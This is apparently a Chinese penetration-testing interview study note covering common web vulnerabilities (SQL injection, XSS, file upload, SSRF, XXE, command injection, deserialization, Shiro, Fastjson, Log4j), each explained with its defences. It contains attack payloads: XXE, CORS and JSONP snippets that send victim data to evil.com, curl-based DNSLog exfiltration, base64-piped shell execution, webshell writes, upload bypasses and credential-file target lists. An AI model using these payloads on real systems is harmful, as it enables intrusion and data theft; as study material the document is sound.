## 

## 自我介绍

 面试官您好，感谢您给我这次面试机会。我是xxx，来自西南科技大学信息安全专业。业余爱好就是打打乒乓球和爬爬山。专业知识方面，主要学习 Web 安全方向。了解 OWASP Top 10 常见漏洞的基本原理和验证思路，熟练使用 Burp Suite、Nmap、SQLMap、FOFA 等安全工具。实践方面，我曾在补天公益 SRC 授权范围内多次开展 Web 资产梳理和漏洞验证，发现并确认过 SQL 注入、日志信息泄露等问题，并完成了证据整理、风险分析和基础报告编写。另外还获得了一个CVE编号，对 Fastjson、Shiro、Log4j 组件或框架的历史漏洞成因和基本验证思路也有一定了解。近期我还通过了 CISP-PTE 考试，在业余时间我持续学习 Go 语言，主要目的是想以后可以独立编写POC，EXP脚本，曾编写过一个 Web 目录扫描工具，实现路径批量访问、并发控制和响应结果整理。

## sql相关：

**注入流程：**

第一步：在可能存在与数据库交互的地方进行尝试，可能是URL，搜索框，POST表单，或者HTTP请求头例如cookie，Referer。
第二步：注入类型，数字型1/0 与1/1返回结果不同因为数字型1/0是非法的，字符型则是拼接各种闭合看是否报错。
第三步：判断闭合方式，字符型的话用1’ and 1=1 --+，或1” and 1=1--+,看看是否报错等。
第四步：判断数据库类型，是mysql还是mssql等，通过语法差异，报错差异，函数差异等。
第五步：基于上面判断是报错注入还是联合注入还是盲注，报错注入使用报错函数获取数据， 联合注入则还需使用order by，union select等判断字段数，然后进一步进进行查询，盲注则需要借助延时函数或外带数据或响应字段数差异判断是否命中。一般src挖掘中获取数据库名或数据库版本我就停止测试了，ctf题或者靶场则会深入查询表中的数据。

“SQL 注入的流程我一般分五步。第一步找注入点，把所有和数据库交互的地方都过一遍，包括 GET、POST 参数，还有 Cookie、Referer、X-Forwarded-For 这些容易被忽略的 Header；对每个参数构造非法语句，比如加单引号、and 1=1 和 and 1=2 做对比，观察报错信息、页面内容或响应长度的差异来初步判断。第二步判断闭合方式和参数类型，确定是数字型还是字符型，闭合符是单引号还是单引号加括号，然后用注释符比如 --+ 闭合后面的语句，构造 and 1=1、and 1=2 验证，如果两次响应不同基本就确认了。第三步判断数据库类型，用上一题说的报错特征、语法差异或者延时函数来识别，因为后面的 payload 都和数据库相关。第四步根据有无回显选择手法：有回显就优先联合注入，用 order by 猜字段数，union select 定位回显位，然后查 version、database；回显不行就试报错注入，比如 updatexml、extractvalue；都没有的话就是盲注，布尔盲注用 ASCII 码配合二分法逐位猜解，时间盲注用 sleep 做延时判断。第五步递进取数，以 MySQL 为例，先拿当前库名，再通过 information_schema 查表名、字段名、最后查具体数据。这里要强调合规边界：挖 SRC 我验证到能证明漏洞存在就停，比如拿到版本号或库名就够了，不拖库不碰敏感数据，只有靶场和 CTF 才往下走完。最后我会给出修复建议：预编译参数化查询、输入做白名单校验、数据库用最小权限账号、线上关闭详细报错回显。”

**分别数据类型：**

“SQL 注入判断数据库类型，我一般按四个层面来做。第一看报错信息，构造非法sql例如加个单引号让数据库报错，MySQL 会报 You have an error in your SQL syntax，MSSQL 报 Incorrect syntax near，Oracle 是 ORA- 开头的错误码，特征很明显；
如果没开报错回显，第二就测语法差异，最经典的是字符串拼接： MySQL：'ab' 'cd'（空格拼接）或 CONCAT('a','b')，MSSQL：'ab'+'cd'， Oracle / PostgreSQL：'ab'||'cd'。
注释符差异，比如#号只有 MySQL 认，还有 Oracle 子查询必须带 FROM dual 这种排他性语法；
第三针对盲注场景，用各库专属的延时函数，MySQL 的 sleep、MSSQL 的 waitfor delay、PostgreSQL 的 pg_sleep、Oracle 的 dbms_pipe，哪个让响应慢了就是哪个，也可以结合 exists 查系统表做布尔判断，比如 information_schema 对应 MySQL 和 PostgreSQL、sysobjects 对应 MSSQL；最后再结合端口和后端环境做旁证，比如 PHP 通常配 MySQL、ASP.NET 通常配 MSSQL，或者直接用 sqlmap 自动识别。总的来说就是报错最快、语法排他性最可靠、延时函数兜盲注、环境信息做辅助。

**防御：**

- 参数化查询使用预编译技术也就是占位符，而非直接将查询参数拼接到原生sql语句中。
- 进行waf防御，也就是过滤恶意字符，例如单双引号，or，and这种关键字，限制只能输入数字或者字母等指定格式内容。
- 最小权限原则，也就是即使真的被入侵了也让攻击者拿到的是最小权限的账号，防止进行更恶劣的操作例如Mysql的UDF提权写入自定义函数造成将mysql权限升级到主机root权限。
- 关闭报错回显等，尽可能的减少正常语句与非法语句的差异。

## XSS相关

 
**xss分类**
“XSS 分三种。反射型：payload 在 URL 参数里，服务器原样拼进响应页，不落库、一次性，需要诱导用户点击恶意链接，常见在搜索框。存储型：payload 存进数据库，比如评论区、个人签名，任何访问该页面的用户都会执行恶意脚本，还能打后台管理员，危害最大。DOM 型：纯前端问题，JS 把 source，也就是 location.hash、location.search 这类不可信输入，直接赋给 sink，比如 innerHTML、document.write、eval、location.href——就像前端重定向逻辑 `location.href = 'path?page=' + getQuery(page)`，page 可控就能跳到恶意站点；它的特殊在于 payload 完全不经过服务器，服务端编码和 WAF 都拦不住，只能靠前端规范比如用 textContent 代替 innerHTML，挖 DOM 型也要直接审计前端 JS 找 source 到 sink 的数据流。”

**xss常用属性标签**

- **直接执行型**：`<script>alert(1)</script>`。注意坑：**innerHTML 注入时 script 不会执行**（浏览器不会执行动态插入的 script），这就是实战为什么首选 img/svg——这个坑说出来很加分。`<iframe srcdoc="&lt;img src=x onerror=alert(1)&gt;"></iframe>`可自动解码
- **事件触发型**（你说的“src 错误自动触发 onerror”这个理解是对的，同类还能扩展）：
  - 自动触发：`<img src=x onerror=alert(1)>`、`<svg onload=alert(1)>`、`<body onload=alert(1)>`、`<details open ontoggle=alert(1)>`、`<input onfocus=alert(1) autofocus>`、`<iframe src=javascript:alert(1)>`
  - 需交互：`<a href=javascript:alert(1)>`（点击）、`onmouseover`（悬停）
- **绕过变体**：大小写（`<ScRiPt>`）、`<image>` 别名、编码（HTML 实体、Unicode）、标签换用（script 被杀换 img/svg/body）

**xss的危害：**
盗取用户凭证会话劫持，最常见的就是盗取cookie，以用户身份伪造请求、键盘记录、页面钓鱼、篡改页面，存储型可以做成 XSS 蠕虫（经典案例是新浪微博蠕虫），打后台管理员是 SRC 里最常见的目标。

**防御**
HTML 实体转义（< > & " '），还可以配置内容安全策略CSP，使用httponly让js无法读取cookie，挡住偷 cookie 这一条，但 XSS 还能以用户身份发请求、记录键盘、改页面。它是缓解措施，不是根治。

**拓展：**

- **XSS 和 CSRF 的区别**：CSRF 是借浏览器自动带 cookie 的信任冒用身份发请求，但看不到响应；XSS 能执行任意 JS，能看到响应、能读 token。有 XSS 基本就能打穿 CSRF 的 token 防御。

- **实战怎么测**：找所有输入输出点（URL 参数、评论、HTTP 头如 UA/Referer、文件上传的文件名），插入带标记的 payload（`'"><script>alert(1)</script>`）后右键查看源码，看是原样输出还是被编码了、编码发生在哪个上下文；DOM 型要读前端 JS 找 sink。测试时用 alert(1) 这类无害验证，SRC 中写报告同样不做真实利用。

## CSRF相关

**原理**
"CSRF 的原理是利用浏览器发起请求**自动携带 cookie** 的特性：用户登录 A 站后没退出，访问了攻击者的页面，页面里藏着对 A 站的伪造请求，比如一个 img 标签或自动提交的表单，浏览器发这个请求时自动带上 A 站 cookie，服务器区分不出是本人还是伪造，转账、改邮箱这类操作就被冒名执行了，用户全程无感知。

**利用条件**
利用条件有三个：用户处于登录态、操作参数可预测可伪造、浏览器自动带 cookie。

**防御**
防御上根本解法是服务端 CSRF Token：服务端生成随机 token 和 session 绑定，请求必须带上并校验，攻击者跨站拿不到 token；Cookie 层配 SameSite，默认 Lax 就能拦掉跨站 POST；再辅助校验 Origin/Referer、关键操作加验证码或二次确认。

**CSRF和 XSS 的关系**
区别是 XSS 能执行任意 JS、能收响应，CSRF 只能发请求收不到响应，因为同源策略限制跨域读；联系是有 XSS 的话 CSRF 防御基本失效——XSS 同源能读 DOM 里的 token，带着 token 发请求就绕过了校验，所以 CSRF 的信任模型建立在‘同源之外拿不到凭证’上，XSS 破坏的正是这个根基。"

## 文件上传相关

**原理**：
文件上传漏洞的原理是把恶意可执行脚本上传到服务器，拿到 webshell。成立的三个条件：第一，文件能成功上传；第二，上传路径可知，攻击者能访问到它；第三，文件能被服务器解析执行。三个条件凑齐就可以传一句话木马，用蚁剑、冰蝎连接。这里有个关键前提要说出来：图片马本身不会执行，必须配合中间件解析漏洞、.htaccess、.user.ini 或文件包含漏洞才有意义——所有绕过手段攻的其实都是“能不能执行”这一环。

**绕过**

1. **前端 JS 校验**：最外层，抓包改包直接绕
2. **后缀黑名单**：大小写（Php）、双写（phphpp）、结尾点（`php.`）、点空点（`php. .`）、NTFS 数据流（`shell.php::$DATA`，Windows 当默认数据流保存）、00 截断（%00，PHP 5.3.4 前）、Windows 长文件名（点空格填满 255，系统自动去末尾点空格）
3. **白名单 → 结合中间件解析漏洞**：Apache 从右往左解析后缀 `shell.php.abc`、IIS6 分号 `shell.asp;.jpg` 和目录解析 `/x.asp/x.jpg`、Nginx 的 fix_pathinfo `/x.jpg/xx.php`
4. **MIME 检测**：Content-Type 改成 image/jpeg
5. **文件头/内容检测**：加 GIF89a 做图片马；遇到二次渲染，就下载渲染后的图和原图对比，把马插进没被重写的区域
6. **系统特性**：就是上面 Windows 末尾点空格那条
7. **逻辑缺陷和特殊文件**：条件竞争——服务器先保存再检查删除的窗口期里并发上传加访问触发；`.htaccess` 让指定后缀按 PHP 解析；FastCGI 下用 `.user.ini` 写 `auto_prepend_file` 包含图片马，**`.user.ini` 所在的目录下，必须有一个正常的 PHP 文件**（比如 `index.php`）。当用户（或攻击者自己）访问这个目录下的 `index.php` 时，PHP 引擎会按照 `.user.ini` 的指示，在执行 `index.php` 前先去“包含”并执行 `a.jpg`。这时，图片马里的恶意代码就会被当作 PHP 代码执行。

**防御**
服务端多重校验：后缀白名单优先，配合 MIME、magic number 文件头一起校验，不信任任何客户端数据，Content-Type 和图片标识都可以伪造；文件名随机化重命名，马传上去也摸不到路径；内容检测拦截恶意代码；禁止“先保存再校验”的逻辑防条件竞争。**最根本的一条：上传目录禁用脚本执行权限，用独立存储域名**——即使所有校验都被绕过，马也执行不了，这才是把“执行”这一环锁死的终极防御。

## SSRF相关

**原理**
服务器请求伪造，利用网站可以向外发起请求，攻击者构造恶意目标让网站去访问，例如攻击者可以访问边界服务器，边界服务器允许访问内网，攻击者不可以访问内网，那攻击者可以让边界服务器访问内网。

**利用方式**

- **打内网**：探测存活主机、端口扫描（看响应时长和报错差异）
- **协议利用**：`file://` 读服务器本地文件（`file:///etc/passwd`）；`gopher://` 是万金油，能构造任意 TCP 报文——用它打**内网 Redis 未授权访问**（写 crontab/SSH key/webshell）是最经典的组合拳；`dict://` 探测服务
- **盲 SSRF**：没回显就用 DNSLog 外带或延时判断，和盲注一个思路

**防御**
① 白名单（域名+协议，禁 file/gopher/dict）；② 请求前解析域名、**校验解析出的 IP 不是内网段**（10/8、172.16/12、192.168/16、127/8、169.254/16）；③ 禁止跟随 302 或跟随后再校验；④ 网络层兜底——服务器出网最小化、内网防火墙隔离。

**白名单怎么绕过**
记四个代表：IP 编码变换（127.0.0.1 → 十进制 2130706433）、`@` 符号（`http://白名单@内网IP`）、302 跳转（先请求白名单域，跳到内网）、**DNS rebinding**（两次解析返回不同 IP，第一次给合法 IP 骗过校验，第二次给内网 IP）——最后这个就是为什么防御要求“校验和请求用同一次解析结果”。

## 文件包含相关

**原理**
文件包含分本地包含（LFI）和远程包含（RFI）。本质：程序使用 include/require 这类包含函数，且被包含的路径用户可控（如 `include($_GET['page'])`），本该包含固定的语言包、模板文件，却被攻击者指定成任意文件。关键特性：**被包含的文件无论什么后缀，里面的 PHP 代码都会被执行**——这是它能和文件上传配合的逻辑基础，也是图片马 getshell 的第二条路。RFI 直接远程包含攻击者服务器上的木马，最危险，受 `allow_url_include` 控制。

**利用**
**伪协议（得分主体，必须熟）**：

- `file://`：读任意文件，`file:///etc/passwd`
- `php://filter/read=convert.base64-encode/resource=index.php`：**base64 读源码**，最高频考点——base64 是为了让源码不被执行而是原样输出
- `php://input`：POST 内容当 PHP 代码执行（需 allow_url_include=On）
- `data://text/plain,<?php code?>`：直接执行（需 allow_url_include=On）
- `phar://`、`zip://`：包含压缩包内的马，配合上传 zip
  **升级为 RCE 的路径（按有无上传点分）**：
- 有上传点：图片马 + 文件包含
- 无上传点：**日志包含**——把 `<?php 一句话?>` 写进 UA 污染 access.log，再包含 `/var/log/nginx/access.log` 执行；同类还有 session 包含、`/proc/self/environ`

**防御**
根本原则是**不让用户控制包含路径**：参数用白名单映射到固定文件，用户只能传页面名不能传路径；关闭 `allow_url_include` 让 RFI 直接失效，`allow_url_fopen` 也建议关；用 `open_basedir` 限制 PHP 可访问目录；过滤目录穿越（`../`）时注意递归过滤存在双写绕过（`....//`）。

## XXE相关

**原理**
XML 外部实体注入。XML 规范允许在 DTD 里定义实体，解析器解析时会展开实体并加载 SYSTEM 关键字指定的外部资源——**注意表述：XML 本身不能“执行命令”，是 SYSTEM 能引用任意文件和 URL，解析器替你读**。根因是程序用了允许加载外部实体的解析配置去解析用户提交的 XML。

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>
```

**利用**

- **有回显读文件**：读PHP 源码用 `php://filter/read=convert.base64-encode/resource=xxx.php`，和文件包含同一套

- **无回显（Blind XXE，你说的“包含远程 DTD”）**：DOCTYPE 里 SYSTEM 引攻击者服务器上的 evil.dtd，dtd 里用参数实体把读到的文件内容拼进 URL，请求攻击者的 DNSLog/服务器完成外带：
  
  ```xml
  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % send SYSTEM "http://evil.com/?f=%file;">
  %send;
  ```

- **SSRF 联动（题目点名）**：SYSTEM 指向内网地址，`<!ENTITY xxe SYSTEM "http://192.168.1.10:6379">`，服务器替你探测内网、打 Redis、访问云元数据 169.254.169.254——XXE 本质就是 SSRF 的一个入口

**防御**

- **根本：禁用外部实体/Dtd**，各语言解析器都有开关——PHP `libxml_disable_entity_loader(true)`（PHP 8 起默认已禁用）；Java 设置 `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` 或 `ACCESS_EXTERNAL_DTD` 置空；Python lxml 用 `resolve_entities=False`；.NET 把 DtdProcessing 设为 Prohibit
- 升级组件：libxml ≥ 2.9 默认不加载外部实体
- 辅助：WAF/黑名单过滤 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`（可绕，只当纵深）；解析服务最小权限、出网最小化

## 命令注入

**原理**
用户输入未过滤地拼接到系统命令执行函数中，拼接内容符合 shell 语法就会被当作命令执行。高频危险函数按语言记：**PHP** 的 `system`、`exec`、`shell_exec`、`passthru`、`popen`、**反引号**（反引号本质调 shell_exec）；**Python** 的 `os.system`、`os.popen`、`subprocess`（`shell=True`）；**Java** 的 `Runtime.getRuntime().exec`。危害是继 webshell 后最直接的——直接 RCE 拿 shell。

**常用连接符号**

| 符号      | 语义              |
| ------- | --------------- |
| ;       | 顺序执行，前面的失败不影响后面 |
| &       | 后台并行执行，两边都跑     |
| &&      | 前面成功才执行后面       |
| \|      | 管道，前面输出传给后面执行   |
| \|\|    | 前面失败才执行后面       |
| 换行符 %0a | 等价分号，URL 编码场景高频 |
| \` \`   | 命令替换，嵌在参数里先执行   |

**绕过**

- **同义命令替换**（你答对了）：cat 被禁 → `tac`（反着读）、`less`、`more`、`nl`、`od`、`xxd`、`head`、`tail`、`sort`；ls 被禁 → `dir`、`find`
- **关键词绕过**：拼接和转义——`ca''t`、`ca\t`、变量拼接 `$a=ca;$b=t;$a$b`。 `${IFS}` 和 `$IFS$9`（$9 是空参数，配合 $IFS 凑空格）
- **空格绕过**：`$IFS`、`${IFS}`、`$IFS$9`、`<`（`cat<flag`）、`{cat,flag}`（花括号展开）
- **通配符绕过关键字**：`/???/?at flag` 绕 /bin/cat、`fla?`、`fla*` 绕 flag 字样——连命令路径里的字母都不出现
- **编码执行**：`echo Y2F0IGZsYWc=|base64 -d|bash`、hex 配 `xxd -r -p|bash`
- **无回显场景**：延时判断（`sleep 5`）、DNSLog 外带（`` `curl http://dnslog/$(whoami)` ``）、写文件再访问（`echo '<?php code?>' > shell.php`）

**防御**

1. **根本：能不调 shell 就不调**——用语言自身的库实现功能；必须调用时用**参数数组**方式传参（Python `subprocess` 传列表不用 `shell=True`、Java 用 ProcessBuilder 数组），让输入永远只是参数不是语法
2. PHP 专属考点：**`escapeshellarg` + `escapeshellcmd`** 转义——这是 PHP 命令注入防御的标准答案，被问“PHP 怎么防”必须能说出这两个函数
3. 白名单 + 严格格式校验
4. 兜底：最小权限账户运行、PHP `disable_functions` 禁危险函数

## 水平越权\&垂直越权

**原理**
越权的本质一句话：**服务端只校验了“你登录没有”，没校验“这个东西是不是你的、这个功能你能不能用”**。前端展示和后端权限是两层，越权就是绕过展示层直接戳后端。

- **水平越权（横向）**：同级用户之间越——A 用户能看/改 B 用户的资源。典型：`/api/order?orderId=12345`，把 ID 改成 12346 返回了别人的订单。这类也叫 **IDOR（不安全的直接对象引用）**，越的是“别人的数据”
- **垂直越权（纵向）**：低权限越到高权限——普通用户能调管理员接口，越的是“权限和功能”
- **未授权访问**：连登录都不要，接口裸奔直接调，通常归为垂直越权的极端情况，SRC 里也常单独算一类

**怎么测试**
水平越权四步法：

1. 注册两个账号 A、B，A 登录后把业务功能全过一遍，抓出请求里标识“资源是谁的”参数——userId、orderId、addressId、phone、email
2. 请求里把资源 ID 换成 B 的，**凭证仍然用 A 的**，看响应：返回了 B 的数据就是水平越权
3. 没条件注册双号就测 ID 可遍历性：自增 ID 是重灾区，递增遍历看是否返回他人数据
4. 删除/修改操作同理：改 ID 提交，看服务端是否真的执行
   垂直越权：
5. 用普通账号登录，从 JS 文件、前端路由、API 文档泄露里收集后台管理接口
6. 拿普通用户的 cookie 直接请求这些接口，能执行成功就是垂直越权——重点是用户管理、审核、改配置这类高危功能

**防御**

1. 服务端强制鉴权：涉及资源归属的接口，从 session/token 取当前身份，与资源属主做比对，不匹配就拒绝——这是根本解法
2. 身份参数不从客户端收：userId 这类能不传就不传，服务端自己从会话取
3. 资源 ID 用不可遍历的 UUID 降低批量遍历风险——注意这只是缓解，不是替代归属校验
4. 垂直越权：后台接口统一鉴权拦截器，按角色（RBAC）校验，而不是依赖前端路由守卫

## 任意文件读取/下载和目录遍历

**原理**
程序把用户可控的路径参数直接传给文件操作函数——PHP 的 `file_get_contents`、`readfile`、`fread`，Java 的 `FileInputStream`，Python 的 `open`——没有校验路径归属。典型：下载接口 `download.php?file=report.pdf`，file 参数改成 `../../../../etc/passwd` 就能读任意文件。
两个名词的关系：目录遍历（Path Traversal）是用 `../` 跳出限定目录的手法，**任意文件读取/下载**是**结果**，本质同一个洞。
**面试必问的区分**：文件读取 vs 文件包含——包含函数（include）会把文件内容**当代码执行**，读取函数只是**拿内容不执行**。所以文件包含能直接 getshell，文件读取一般是信息收集起步。

**利用**
**基本姿势**：Linux 用 `../`（`../../../../../etc/passwd`，层数不确定就多写，多余的会被根目录消化掉）；Windows 用 `..\..\..\windows\win.ini`；能传绝对路径就直接 `/etc/passwd`。
高价值目标清单（必背）：

- Linux：`/etc/passwd`（确认可读）、`/root/.bash_history`（运维习惯）、`/etc/nginx/nginx.conf`、`/proc/self/environ`（环境变量，可能有 SECRET_KEY）、**`~/.ssh/id_rsa`**（直接 SSH 上机）、**应用配置文件**（`.env`、`config.php`、`application.properties`——拿数据库账号，这是文件读取最大的价值）
- Windows：`win.ini`、`C:\Windows\repair\sam`、**`web.config`**（.NET 连接串和密钥）、`my.ini`
- Java 应用：`web.xml`、`WEB-INF/classes/` 下的配置和 class 文件
  配合升级：读 `.env` 拿数据库密码 → 直连；读 `.bash_history` 摸清备份路径和密码习惯；读取函数多为 PHP 时还支持伪协议——`php://filter/read=convert.base64-encode/resource=index.php` 照样能读源码（读取和包含在这里边界模糊）。
  常见绕过：递归过滤用双写 `....//`；URL 编码 `%2e%2e%2f`、混合 `..%2f`；黑名单拦相对路径就直接用绝对路径。

**防御**

1. 根本：**不把用户输入当路径用**——白名单映射，前端传文件 ID，服务端查表得到真实路径（和文件包含防御同构）
2. 必须动态时：`realpath()` 规范化路径后校验前缀是否在限定目录内（PHP 配 `open_basedir`）
3. 下载目录固定、文件名服务端生成，运行账户对敏感目录无读权限（最小权限兜底）

## CORS配置错误

**原理一句话**：同源策略禁止页面读跨域响应，CORS 是官方开的“白名单通道”——服务端在响应头里声明“允许谁读”。开错了就成了漏洞。

**两种典型错误配置**：

1. `Access-Control-Allow-Origin: *` + 敏感接口——任意网站都能读（带凭证时浏览器其实会拒绝，所以危害大的是第二种）
2. **反射 Origin**（最经典）：服务端把请求头里的 Origin 原样填回 `Access-Control-Origin`，还配了 `Access-Control-Allow-Credentials: true`——等于宣布“任何人带着 cookie 来我都能让他读”

**利用**：受害者登录了 victim.com，访问攻击者页面，页面里：

```
fetch("http://victim.com/api/userinfo", {credentials: "include"}).then(r => r.text()).then(d => fetch("http://evil.com/?data=" + d))
```

浏览器自动带 cookie、响应头又允许 evil.com 读——攻击者页面直接拿到受害者的个人信息外带。

**怎么测**：给请求加 `Origin: http://evil.com`，看响应头是否原样反射 + 是否带 credentials 头，两个都有就是洞。Burp 插件 CORS*One 帮你测。

**防御**：不反射 Origin，服务端写死域名白名单比对；`*` 和 credentials 永远不同时用；敏感接口不开跨域。

## JSONP劫持

**原理一句话**：同源策略不拦 `<script src>`，JSONP 就借 script 标签跨域加载，用回调函数包裹数据——老式跨域方案，CORS 普及前的主流。
**劫持条件三个**：接口返回敏感数据 + **callback 参数可控** + 凭证靠 cookie 自动携带（无 token 校验）。凑齐就是信息泄露：

```
<script src="http://victim.com/api/user?callback=steal"></script><script>function steal(d){ new Image().src="http://evil.com/?"+JSON.stringify(d) }</script>
```

受害者登录状态下打开攻击者页面，script 请求自动带 cookie，返回 `steal({"phone":"138..."})`，数据直接进攻击者的函数。

**防御**：敏感接口根本不用 JSONP（现代方案统一走 CORS）；callback 参数白名单或严格正则限制字符；辅助校验 Referer。

**收拢记忆**：CORS 和 JSONP 是“跨域读”的两条合法通道——一个靠响应头、一个靠 script 标签——漏洞都是把通道开给了不该开的源。

## DNS

递归查询与迭代查询：
迭代查询，例如浏览器访问www.bilibili.com并且本地DNS没有缓存，那么会先去查询根域名服务器（.），然后询问根域名服务器com.顶级域名服务器的IP与之建立连接，然后询问顶级域名服务器bilibili.com.的权威域名服务器的IP与之建立连接，在之后就是询问bilibili.com.域名www.bilibili.com.的IP是多少。

递归的话就是自动化的迭代查询。

## windows日志

登陆成功日志ID：4624
登陆失败日志ID：4625
特殊权限登陆日志ID：4672

## linux

history与.bash_history区别

| 对比维度       | `history`（命令）                  | `~/.bash_history`（文件）                         |
| ---------- | ------------------------------ | --------------------------------------------- |
| **存储位置**   | **内存**（当前Shell会话的缓冲区）          | **磁盘**（用户家目录下的隐藏文件）                           |
| **更新时机**   | **实时**，敲完命令立刻出现在 `history` 列表中 | **延迟写入**，仅在当前Shell**正常退出（exit）** 时才追加写入       |
| **能否手动写入** | 不能直接写，但可用 `history -c` 清空内存    | 可手动编辑（`vim .bash_history`）或 `history -w` 强制写入 |
| **攻击者关注点** | 正在运行的会话中，未写入磁盘的“热乎”命令          | 攻击者入侵后**必删的痕迹**（抹除操作记录）                       |
| **应急响应排查** | 只能查当前在线用户的实时操作（`w` 看谁在线）       | 查历史遗留痕迹，但**可能已被篡改或删除**                        |

## shiro

**550**
核心：

- AES硬编码在源码中，攻击者通过审计源码获得Key。
- rememberMe值生成逻辑：java对象=》序列化=》AES加密=》base64编码=》设置为cookie中remeberMe的值。
- AES密钥泄露整个加密逻辑就几乎透明，攻击者可以轻松构造恶意java对象生成恶意的rememberMe值替换原来的。
- 成功表中，响应包里出现rememberMe中有deleteMe，服务端检测到异常执行删除，但此时恶意代码已经被触发。

**721**
由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。

- 一个合法的cookie

**检测特征是 rememberMe=deleteMe——那具体怎么利用这个特征爆破 key？发送什么样的请求、key 正确和错误时响应分别是什么、判定依据是什么？**

|              | 550             | 721                        |     |
| ------------ | --------------- | -------------------------- | --- |
| 前提           | key 默认/可猜       | 一个合法的登录 cookie             |     |
| 需要 key？      | 要（爆破得出）         | 完全不需要                      |     |
| deleteMe 的角色 | 爆破 key 的判定信号    | padding oracle 预言机         |     |
| 版本           | ≤1.2.4 + 抄默认配置的 | 1.2.4–1.4.1（CBC），1.4.2+ 修复 |     |
| 速度           | 快               | 极慢，伪造一个 payload 发成千上万请求    |     |

一句话总结面试版：**“deleteMe 是 Shiro 的通用异常信号，550 拿它当爆破 key 的判定，721 拿它当 padding oracle 的预言机；前者需要 key，后者只需要一个有效 cookie。”**

## PHP反序列化

**原理**
`unserialize()` 把字符串还原成 PHP 对象，**属性值完全由字符串控制**。如果程序对用户输入调用了 unserialize，且代码里有可串成“到危险函数”路径的类，就能构造 POP 链拿 RCE。两个关键前提：① 有 `unserialize(用户输入)` 或 phar 触发点；② 有可利用的类。

```text
O:4:"Test":1:{s:4:"name";s:5:"admin";}
│  │     │    │      │        └ 属性值(字符串 长度5)
│  │     │    │      └ 属性名(字符串 长度4)
│  │     │    └ 属性个数
│  │     └ 类名
│  └ 类名长度
└ O=对象 (s=字符串 i=整数 b=布尔 a=数组 N=null)
```

**魔法方法清单**

| 方法             | 触发时机                    | 链中角色                               |
| -------------- | ----------------------- | ---------------------------------- |
| __wakeup()     | unserialize 时立即触发       | 入口①                                |
| __destruct()   | 对象销毁时（脚本结束/unset）       | 入口②（最常用）——unserialize 出来的对象脚本结束必销毁 |
| __toString()   | 对象被当字符串用（echo、拼接、字符串函数） | 跳板/链接器                             |
| __call()       | 调用不存在或不可访问的实例方法         | 跳板                                 |
| __callStatic() | 调用不存在的静态方法              | 跳板                                 |
| __get()        | 读不存在/不可访问的属性            | 跳板                                 |
| __set()        | 写不可访问的属性                | 跳板                                 |
| __isset()      | 对不可访问属性 isset()         | 少见                                 |
| __invoke()     | 对象被当函数调 $obj()          | 跳板                                 |
| __construct()  | 只在 new 时触发              | unserialize 不触发它，注意别记错             |
| __sleep()      | serialize 时             | 反序列化利用中基本不用                        |

- **phar 反序列化**（必背）：`file_exists()`、`file_get_contents()`、`is_file()` 这类**文件操作函数**的参数是 `phar://xxx.phar` 时，会**自动反序列化 phar 文件里的 meta-data**——**不需要代码里出现 unserialize()**，只要有上传点 + 一个文件操作函数就能打，是“有上传、无反序列化入口”场景的标准解法，和文件上传那题直接联动

**防御**

1. 根本：**不 unserialize 用户输入**，数据交换用 JSON（无对象恢复语义）
2. 危险函数（eval/system/include）不要写在能被属性触发的路径上
3. phar 面：文件操作函数不接受用户可控路径（和文件读取/包含防御同构）

## fastjson

**1.2.24-rce**
**原理**

- Fastjson 的 autoType 功能允许通过 @type 字段指定需要实例化的 Java 类。由于对类名的校验不完善， 攻击者可以指定危险类（如 JdbcRowSetImpl ），利⽤其 setter ⽅法触发 JNDI 注⼊，连接攻 击者控制的 RMI/LDAP 服务器，从⽽加载并执⾏远程恶意代码，实现远程代码执⾏。

**1.2..47-rce**
**原理**
相比**1.2.24**引入 `checkAutoType` 防护，直接使用 `JdbcRowSetImpl` 会被黑名单拦截抛出异常。

- **解析第 1 部分：** 使用 `@type: "java.lang.Class"` 传入 `JdbcRowSetImpl`，Fastjson 处理时会将这个类通过 `TypeUtils.loadClass()` **加载并自动保存到全局内存缓存** (`mappings`) 中。

- **解析第 2 部分：** 当再次传入黑名单类 `JdbcRowSetImpl` 时，`checkAutoType` 会**优先检查内存缓存**，发现已存在于缓存中便直接返回，**跳过了后面的黑名单拦截**，从而成功实例化恶意类并触发 JNDI 注入。

## log4j

**log4j（CVE-2017-5645）**
**原理**

- 服务端接收不可信的序列化日志事件并自动进行反序列化，攻击者可以利用类路径中的危险利用链执行任意代码。

**Log4j2 JNDI 注入（CVE-2021-44228）**
**原理**

- Log4j2 JNDI 注入漏洞。当攻击者可控的内容被写入日志时，Log4j2 会解析其中的 `${jndi:...}` Lookup，并通过 LDAP 或 RMI 发起 JNDI 请求。在特定 JDK 和网络条件下，目标会加载攻击者控制的远程类，从而导致任意代码执行。

## NAT

**NAT（网络地址转换）** 是一种让多个设备能共享一个公网IP地址上网的关键技术，它像一位“翻译官”或“门卫”，在私有网络（如家庭局域网）和公共网络（如互联网）之间转换IP地址。

## 面对登陆框测试点

- 认证绕过：检查认证逻辑、验证码、状态码和跳转逻辑是否可被绕过；

- 用户名枚举：比较错误信息、响应长度、状态码和响应时间；

- 暴力破解、密码喷洒、撞库：重点观察是否存在限速、锁定、验证码和告警；

- 前端泄露：检查 JS、Source Map、配置文件中是否残留测试账号或接口信息；

- 密码策略：检查弱密码、长度限制、复杂度和历史密码限制；

- 会话安全：检查登录后 Session 是否更新、退出后 Token 是否失效、Remember Me 是否安全；

- 密码找回和多因素认证：检查验证码绑定、重放、越权和流程绕过；

- CSRF、开放重定向和登录状态异常。
  
  ## 面对输入框的测试点

- SQL注入；

- 反射型、存储型和 DOM 型 XSS；

- 命令注入、模板注入和表达式注入；

- 路径遍历、文件包含和任意文件读取；

- SSRF、XXE 和反序列化，前提是该输入确实会触发对应功能；

- 类型混淆、重复参数、数组参数和参数污染；

- 批量赋值、越权字段、长度限制和业务校验绕过；

- 文件名、扩展名、MIME 类型和上传内容校验。
  
  ## 短信验证码逻辑缺陷

- 验证码为绑定手机号

- 短信轰炸（并发与intruder，1分钟15条）

- 手机号验证码双发：
